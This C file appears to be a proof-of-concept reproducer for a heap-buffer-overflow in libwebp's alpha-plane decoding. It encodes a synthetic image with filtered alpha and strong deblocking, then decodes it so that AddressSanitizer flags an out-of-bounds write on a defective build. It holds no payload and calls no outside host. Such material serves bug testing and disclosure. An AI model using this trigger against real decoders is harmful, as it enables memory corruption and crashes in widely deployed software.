// Proof-of-concept for a heap-buffer-overflow in libwebp's lossy alpha-plane
// decoding, reachable through the public decode API.
//
// The probe builds an ordinary RGBA image, encodes it as a lossy WebP with a
// (non-compressed, filtered) alpha channel and strong in-loop filtering, then
// decodes it back with WebPDecodeRGBA(). Everything here is in-contract use of
// the public API from <webp/encode.h> and <webp/decode.h>.
//
// On a fixed tree the decode completes cleanly. On the defective tree the alpha
// sliding-window buffer is sized one row too small for the strong-filter
// hold-back geometry, so unfiltering the final macroblock row writes past the
// end of the alpha plane -> AddressSanitizer reports a heap-buffer-overflow.
#include <stdio.h>
#include <stdlib.h>

#include "webp/decode.h"
#include "webp/encode.h"

int main(void) {
  const int width = 64;
  const int height = 256;  // taller than the alpha window -> window slides
  int i;
  uint8_t* rgba = (uint8_t*)malloc((size_t)width * height * 4);
  uint8_t* encoded = NULL;
  uint8_t* decoded = NULL;
  size_t encoded_size;
  int dec_w = 0, dec_h = 0;
  WebPConfig config;
  WebPPicture picture;
  WebPMemoryWriter writer;
  int rc = 0;

  if (rgba == NULL) return 1;
  for (i = 0; i < width * height; ++i) {
    rgba[4 * i + 0] = (uint8_t)(i * 7);
    rgba[4 * i + 1] = (uint8_t)(i * 13);
    rgba[4 * i + 2] = (uint8_t)(i ^ (i >> 3));
    rgba[4 * i + 3] = (uint8_t)(i * 3 + 11);  // non-trivial alpha plane
  }

  if (!WebPConfigInit(&config) || !WebPPictureInit(&picture)) {
    free(rgba);
    return 1;
  }
  config.lossless = 0;
  config.quality = 80.f;
  config.method = 4;
  config.filter_strength = 60;  // engage the in-loop deblocking filter
  config.filter_type = 1;       // 1 = strong (complex) filter
  config.alpha_compression = 0;  // store alpha uncompressed (filtered)
  config.alpha_filtering = 2;
  config.alpha_quality = 100;

  picture.use_argb = 0;
  picture.width = width;
  picture.height = height;
  WebPMemoryWriterInit(&writer);
  picture.writer = WebPMemoryWrite;
  picture.custom_ptr = &writer;

  if (!WebPPictureImportRGBA(&picture, rgba, width * 4) ||
      !WebPEncode(&config, &picture)) {
    WebPPictureFree(&picture);
    WebPMemoryWriterClear(&writer);
    free(rgba);
    return 1;
  }
  WebPPictureFree(&picture);
  free(rgba);

  encoded = writer.mem;
  encoded_size = writer.size;

  // Crafted-but-in-contract bytes: decode them through the public API.
  decoded = WebPDecodeRGBA(encoded, encoded_size, &dec_w, &dec_h);
  if (decoded == NULL) {
    rc = 1;
  } else {
    if (dec_w != width || dec_h != height) rc = 1;
    WebPFree(decoded);
  }
  WebPMemoryWriterClear(&writer);
  return rc;
}
